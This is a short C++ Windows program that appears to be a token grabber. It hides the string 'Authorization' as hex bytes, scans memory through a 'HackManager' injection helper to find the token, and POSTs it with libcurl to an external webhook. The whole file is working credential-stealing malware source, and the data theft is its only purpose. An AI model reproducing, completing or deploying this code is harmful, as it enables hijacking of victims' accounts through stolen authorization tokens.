#include "Injection.h"
#include "curl/curl.h"
#include "secret.h"

unsigned char HEADER[] = {
    0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E,
    0x00, 0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x00
};

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    auto Token = HackManager().GetLocation(HEADER, sizeof(HEADER));
    if (Token.length() > 0) {
        Token = "content=" + Token;
        CURL* req = curl_easy_init(); CURLcode res;
        curl_easy_setopt(req, CURLOPT_URL, WEBHOOK);
        curl_easy_setopt(req, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(req, CURLOPT_POSTFIELDS, Token.c_str());
        curl_easy_setopt(req, CURLOPT_POST, true);
        res = curl_easy_perform(req);
        curl_easy_cleanup(req);
    }
}